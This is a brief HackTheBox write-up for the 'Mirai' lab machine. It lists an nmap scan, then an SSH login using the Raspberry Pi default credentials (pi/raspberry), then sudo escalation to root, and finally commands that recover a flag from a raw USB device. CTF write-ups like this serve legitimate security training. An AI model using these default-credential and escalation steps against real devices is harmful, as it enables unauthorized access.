# HackTheBox Mirai Writeup

![date](https://img.shields.io/badge/date-02.21.2019-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)  
![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
![score](https://img.shields.io/badge/score-0-blue.svg)
![solves](https://img.shields.io/badge/solves-3144-brightgreen.svg)

## Detailed Solution

### Nmap Scan 

      > nmap -sC -sV -oA nmap/initial 10.10.10.48

### Burp Intercept

      You need to modify host to get response.
      
### Then change host file to access target webpage
       
### Login using RaspberryPi default credentials.

      > ssh pi@10.10.10.48 (passwd: raspberry)
      > sudo -l
      > sudo su -
      > df -lh
      > mount
      > cd /media/usbstick/
      
      > strings /dev/sdb
      > xxd /dev/sdb | grep -v '0000 0000 0000 0000 0000 0000 0000 0000'
      > grep -a '[a-z0-9]\{32\}' /dev/sdb
      > grep -B2 -A2 -a '[a-z0-9]\{32\}' /dev/sdb
      > which dd
      > which dcfldd
      
      > ssh pi@10.10.10.48 "sudo dcfldd if=/dev/sdb"
